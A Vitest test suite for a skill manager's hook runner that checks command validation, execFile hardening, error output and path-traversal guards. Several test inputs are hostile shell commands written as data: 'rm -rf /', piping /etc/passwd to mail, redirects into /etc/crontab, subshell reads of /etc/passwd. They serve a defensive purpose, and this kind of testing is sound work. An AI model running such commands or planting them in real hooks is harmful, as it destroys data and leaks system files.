import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { GoodBoyManifest } from '../types/index.js';

// Explicit factory — avoids copying util.promisify.custom from Node's real execFile,
// which would cause promisify() to bypass our mock entirely.
vi.mock('node:child_process', () => ({ execFile: vi.fn() }));
vi.mock('node:fs');
vi.mock('./logger.js', () => ({
  logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), success: vi.fn() },
}));

import { execFile } from 'node:child_process';
import { lstatSync } from 'node:fs';
import { logger } from './logger.js';
import { runHooks, resolveHookPath } from './hooks.js';

const mockExecFile = vi.mocked(execFile);
const mockLoggerWarn = vi.mocked(logger.warn);
const mockLstatSync = vi.mocked(lstatSync);

const BASE: GoodBoyManifest = {
  name: 'test-skill',
  version: '0.1.0',
  description: 'Test skill',
  author: { name: 'Test Author' },
  license: 'MIT',
  entry: 'index.ts',
  language: 'typescript',
  schema_version: '1.0.0',
  status: 'experimental',
};

const CTX = { skillName: 'test-skill', skillPath: '/tmp/test-skill' };

function withHook(hookName: keyof NonNullable<GoodBoyManifest['hooks']>, cmd: string): GoodBoyManifest {
  return { ...BASE, hooks: { [hookName]: cmd } };
}

function setupSuccess(): void {
  mockExecFile.mockImplementation((...args: any[]) => {
    const cb = args[args.length - 1];
    if (typeof cb === 'function') cb(null, '', '');
  });
}

function setupFailure(message: string): void {
  mockExecFile.mockImplementation((...args: any[]) => {
    const cb = args[args.length - 1];
    if (typeof cb === 'function') cb(new Error(message));
  });
}

function setupTimeout(useKilled = true): void {
  mockExecFile.mockImplementation((...args: any[]) => {
    const cb = args[args.length - 1];
    if (typeof cb === 'function') {
      const err = Object.assign(new Error('Process killed'), {
        killed: useKilled,
        code: useKilled ? undefined : 'ETIMEDOUT',
      });
      cb(err);
    }
  });
}

function setupNonErrorThrow(): void {
  mockExecFile.mockImplementation((...args: any[]) => {
    const cb = args[args.length - 1];
    if (typeof cb === 'function') cb('string error, not an Error instance');
  });
}

// ---------------------------------------------------------------------------
// Command validation (parseHookCommand) — throws BEFORE execFile is called
// ---------------------------------------------------------------------------

describe('runHooks() — command validation', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // FORBIDDEN_CHARS: /[&|;`$(){}<>\\"']/

  it('rejects && (shell injection via &)', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup.js && rm -rf /'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects | (pipe)', async () => {
    await expect(runHooks(withHook('postinstall', 'cat /etc/passwd | mail a@b.com'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects ; (semicolon command separator)', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup.js; rm -rf /'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects $(...) (dollar subshell expansion)', async () => {
    await expect(runHooks(withHook('postinstall', 'node $(cat /etc/passwd)'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects ` (backtick subshell expansion)', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup`evil`.js'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects > (output redirect)', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup.js > /etc/crontab'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects < (input redirect)', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup.js < /etc/passwd'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects { (brace grouping)', async () => {
    await expect(runHooks(withHook('postinstall', 'node { echo evil; }'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects ( (subshell grouping)', async () => {
    await expect(runHooks(withHook('postinstall', 'node (evil)'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects a command exceeding the 256-character limit', async () => {
    // "node " (5) + 252 "a"s = 257 chars > 256
    const longCmd = 'node ' + 'a'.repeat(252);
    expect(longCmd.length).toBe(257);
    await expect(runHooks(withHook('postinstall', longCmd), ['postinstall'], CTX))
      .rejects.toThrow('Hook command exceeds the maximum allowed length of 256 characters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('accepts a command exactly at the 256-character limit', async () => {
    setupSuccess();
    const maxCmd = 'node ' + 'a'.repeat(251);
    expect(maxCmd.length).toBe(256);
    await expect(runHooks(withHook('postinstall', maxCmd), ['postinstall'], CTX))
      .resolves.toBeUndefined();
  });

  it('rejects an empty hook command string', async () => {
    await expect(runHooks(withHook('postinstall', '   '), ['postinstall'], CTX))
      .rejects.toThrow('Hook command is empty');
    expect(mockExecFile).not.toHaveBeenCalled();
  });
});

// ---------------------------------------------------------------------------
// Execution dispatch — what runHooks calls and how errors are mapped
// ---------------------------------------------------------------------------

describe('runHooks() — execution', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('skips hooks not listed in hookNames', async () => {
    setupSuccess();
    const manifest = withHook('preinstall', 'node --version');
    await runHooks(manifest, ['postinstall'], CTX);
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('does nothing when the manifest has no hooks object', async () => {
    await runHooks(BASE, ['postinstall'], CTX);
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('does nothing when the requested hook is not defined on the manifest', async () => {
    const manifest: GoodBoyManifest = { ...BASE, hooks: { preinstall: 'node --version' } };
    await runHooks(manifest, ['postinstall'], CTX);
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('calls execFile with the binary and args split correctly', async () => {
    setupSuccess();
    await runHooks(withHook('postinstall', 'node --version'), ['postinstall'], CTX);
    expect(mockExecFile).toHaveBeenCalledWith(
      'node',
      ['--version'],
      expect.objectContaining({ timeout: 30_000, cwd: CTX.skillPath }),
      expect.any(Function),
    );
  });

  it('calls execFile with cwd set to context.skillPath', async () => {
    setupSuccess();
    const ctx = { skillName: 'my-skill', skillPath: '/custom/path' };
    await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], ctx);
    expect(mockExecFile).toHaveBeenCalledWith(
      'node',
      ['setup.js'],
      expect.objectContaining({ cwd: '/custom/path' }),
      expect.any(Function),
    );
  });

  it('calls execFile with a 30-second timeout', async () => {
    setupSuccess();
    await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX);
    expect(mockExecFile).toHaveBeenCalledWith(
      expect.any(String),
      expect.any(Array),
      expect.objectContaining({ timeout: 30_000 }),
      expect.any(Function),
    );
  });

  it('runs multiple hooks in the order specified by hookNames', async () => {
    setupSuccess();
    const calls: string[] = [];
    mockExecFile.mockImplementation((...args: any[]) => {
      calls.push(args[0] as string);
      const cb = args[args.length - 1];
      if (typeof cb === 'function') cb(null, '', '');
    });
    const manifest: GoodBoyManifest = {
      ...BASE,
      hooks: {
        preinstall: 'alpha',
        postinstall: 'beta',
      },
    };
    await runHooks(manifest, ['preinstall', 'postinstall'], CTX);
    expect(calls).toEqual(['alpha', 'beta']);
  });

  it('resolves without calling execFile when hookNames is empty', async () => {
    await runHooks(withHook('postinstall', 'node setup.js'), [], CTX);
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('throws `Hook "X" failed: <first line>` on non-timeout failure', async () => {
    setupFailure('command not found\nat some stack frame');
    await expect(runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX))
      .rejects.toThrow('Hook "postinstall" failed: command not found');
  });

  it('does not expose inner stack trace lines in failure messages', async () => {
    setupFailure('first line\n    at Object.<anonymous> (hidden.js:1)\n    at ...more');
    const err = await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX)
      .catch((e: unknown) => e as Error);
    expect(err.message).not.toContain('at Object');
    expect(err.message).not.toContain('hidden.js');
  });

  it('throws `Hook "X" timed out` when killed:true', async () => {
    setupTimeout(true);
    await expect(runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX))
      .rejects.toThrow('Hook "postinstall" timed out after 30 seconds');
  });

  it('throws `Hook "X" timed out` when code is ETIMEDOUT', async () => {
    setupTimeout(false);
    await expect(runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX))
      .rejects.toThrow('Hook "postinstall" timed out after 30 seconds');
  });

  it('throws `Hook "X" failed` when a non-Error is thrown', async () => {
    setupNonErrorThrow();
    await expect(runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX))
      .rejects.toThrow('Hook "postinstall" failed');
  });

  it('stops execution after the first failing hook', async () => {
    setupFailure('first hook failed');
    const manifest: GoodBoyManifest = {
      ...BASE,
      hooks: { preinstall: 'node first.js', postinstall: 'node second.js' },
    };
    await runHooks(manifest, ['preinstall', 'postinstall'], CTX).catch(() => {});
    expect(mockExecFile).toHaveBeenCalledOnce();
  });
});

// ---------------------------------------------------------------------------
// HARDENING 1 — new checks (FORBIDDEN_CHARS expansion, arg count, binary
// whitelist advisory, execFile options, hook output handling)
// ---------------------------------------------------------------------------

describe('runHooks() — expanded FORBIDDEN_CHARS', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('rejects ! (history expansion)', async () => {
    await expect(runHooks(withHook('postinstall', 'node !foo'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects # (comment injection)', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup.js # rm -rf /'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects newline character in command', async () => {
    await expect(runHooks(withHook('postinstall', 'node setup.js\nrm -rf /'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects null byte in command', async () => {
    await expect(runHooks(withHook('postinstall', 'node\x00evil'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('rejects * (glob expansion)', async () => {
    await expect(runHooks(withHook('postinstall', 'node *.js'), ['postinstall'], CTX))
      .rejects.toThrow('Hook command contains forbidden shell metacharacters');
    expect(mockExecFile).not.toHaveBeenCalled();
  });
});

describe('runHooks() — argument count limit', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('rejects a command with more than 10 arguments', async () => {
    // 'node' + 11 args = 12 parts total; 11 args exceeds max 10
    const tooManyArgs = 'node ' + Array.from({ length: 11 }, (_, i) => `a${i}`).join(' ');
    await expect(runHooks(withHook('postinstall', tooManyArgs), ['postinstall'], CTX))
      .rejects.toThrow('Hook command has too many arguments (max 10)');
    expect(mockExecFile).not.toHaveBeenCalled();
  });

  it('accepts a command with exactly 10 arguments', async () => {
    setupSuccess();
    const tenArgs = 'node ' + Array.from({ length: 10 }, (_, i) => `a${i}`).join(' ');
    await expect(runHooks(withHook('postinstall', tenArgs), ['postinstall'], CTX))
      .resolves.toBeUndefined();
  });
});

describe('runHooks() — binary whitelist advisory', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('logs a warning for a binary not in the allowed list', async () => {
    setupSuccess();
    await runHooks(withHook('postinstall', 'alpha'), ['postinstall'], CTX);
    expect(mockLoggerWarn).toHaveBeenCalledWith(
      expect.stringContaining('"alpha" is not in the GoodBoy allowed list'),
    );
  });

  it('does not log a warning for a binary in the allowed list', async () => {
    setupSuccess();
    await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX);
    expect(mockLoggerWarn).not.toHaveBeenCalled();
  });

  it('still calls execFile even when binary is not in the allowed list', async () => {
    setupSuccess();
    await runHooks(withHook('postinstall', 'alpha'), ['postinstall'], CTX);
    expect(mockExecFile).toHaveBeenCalledOnce();
  });
});

describe('runHooks() — execFile options hardening', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('calls execFile with maxBuffer of 1 MiB', async () => {
    setupSuccess();
    await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX);
    expect(mockExecFile).toHaveBeenCalledWith(
      expect.any(String),
      expect.any(Array),
      expect.objectContaining({ maxBuffer: 1024 * 1024 }),
      expect.any(Function),
    );
  });

  it('calls execFile with windowsHide: true', async () => {
    setupSuccess();
    await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX);
    expect(mockExecFile).toHaveBeenCalledWith(
      expect.any(String),
      expect.any(Array),
      expect.objectContaining({ windowsHide: true }),
      expect.any(Function),
    );
  });

  it('calls execFile with a minimal env containing NODE_ENV', async () => {
    setupSuccess();
    await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX);
    expect(mockExecFile).toHaveBeenCalledWith(
      expect.any(String),
      expect.any(Array),
      expect.objectContaining({
        env: expect.objectContaining({ NODE_ENV: expect.any(String) }),
      }),
      expect.any(Function),
    );
  });
});

describe('runHooks() — hook output handling', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('shows last 200 chars of stderr on failure', async () => {
    const stderrContent = 'Error: permission denied reading config';
    mockExecFile.mockImplementation((...args: any[]) => {
      const cb = args[args.length - 1];
      if (typeof cb === 'function') {
        cb(Object.assign(new Error('Command failed'), { stderr: stderrContent }));
      }
    });
    const err = await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX)
      .catch((e: unknown) => e as Error);
    expect(err.message).toContain(stderrContent);
  });

  it('truncates stderr to the last 200 characters on failure', async () => {
    const longStderr = 'x'.repeat(300);
    mockExecFile.mockImplementation((...args: any[]) => {
      const cb = args[args.length - 1];
      if (typeof cb === 'function') {
        cb(Object.assign(new Error('Command failed'), { stderr: longStderr }));
      }
    });
    const err = await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX)
      .catch((e: unknown) => e as Error);
    // Prefix "Hook "postinstall" failed: " + 200 x's = under 300 total chars
    expect(err.message.length).toBeLessThan(300);
    expect(err.message).toContain('x'.repeat(200));
  });

  it('falls back to first line of error.message when no stderr present', async () => {
    setupFailure('first line\n    at stack frame');
    const err = await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX)
      .catch((e: unknown) => e as Error);
    expect(err.message).toContain('first line');
    expect(err.message).not.toContain('at stack frame');
  });

  it('falls back to error.message when stderr is present but empty', async () => {
    mockExecFile.mockImplementation((...args: any[]) => {
      const cb = args[args.length - 1];
      if (typeof cb === 'function') {
        cb(Object.assign(new Error('command failed'), { stderr: '' }));
      }
    });
    const err = await runHooks(withHook('postinstall', 'node setup.js'), ['postinstall'], CTX)
      .catch((e: unknown) => e as Error);
    expect(err.message).toContain('command failed');
  });
});

// ---------------------------------------------------------------------------
// resolveHookPath() — path validation and traversal guard
// ---------------------------------------------------------------------------

describe('resolveHookPath()', () => {
  const SKILL_DIR = '/tmp/test-skill';

  beforeEach(() => {
    vi.clearAllMocks();
  });

  function fakeStatFile(): ReturnType<typeof lstatSync> {
    return { isSymbolicLink: () => false, isFile: () => true } as unknown as ReturnType<typeof lstatSync>;
  }

  it('throws when hookRelativePath is empty', () => {
    expect(() => resolveHookPath(SKILL_DIR, '')).toThrow('Hook path must not be empty');
  });

  it('throws when hookRelativePath is an absolute path', () => {
    expect(() => resolveHookPath(SKILL_DIR, '/etc/passwd')).toThrow('Hook path must be relative');
  });

  it('throws when hookRelativePath contains a null byte', () => {
    expect(() => resolveHookPath(SKILL_DIR, 'scripts/\0evil.sh')).toThrow('Hook path contains invalid characters');
  });

  it('throws when hookRelativePath escapes the skill directory via ".."', () => {
    // Schema pattern blocks ".." but resolveHookPath is the runtime security boundary
    expect(() => resolveHookPath(SKILL_DIR, '../sibling/evil.sh')).toThrow('Hook path escapes the skill directory');
  });

  it('throws when the resolved file does not exist', () => {
    mockLstatSync.mockImplementation(() => { throw new Error('ENOENT'); });
    expect(() => resolveHookPath(SKILL_DIR, 'scripts/run.sh')).toThrow('Hook script not found');
  });

  it('throws when the resolved path is a symbolic link', () => {
    mockLstatSync.mockReturnValue(
      { isSymbolicLink: () => true, isFile: () => false } as unknown as ReturnType<typeof lstatSync>,
    );
    expect(() => resolveHookPath(SKILL_DIR, 'scripts/run.sh')).toThrow('Hook path must not be a symbolic link');
  });

  it('throws when the resolved path is a directory, not a regular file', () => {
    mockLstatSync.mockReturnValue(
      { isSymbolicLink: () => false, isFile: () => false } as unknown as ReturnType<typeof lstatSync>,
    );
    expect(() => resolveHookPath(SKILL_DIR, 'scripts')).toThrow('Hook path is not a regular file');
  });

  it('returns the resolved absolute path for a valid regular file', () => {
    mockLstatSync.mockReturnValue(fakeStatFile());
    const result = resolveHookPath(SKILL_DIR, 'scripts/run.sh');
    expect(result).toBe('/tmp/test-skill/scripts/run.sh');
  });
});
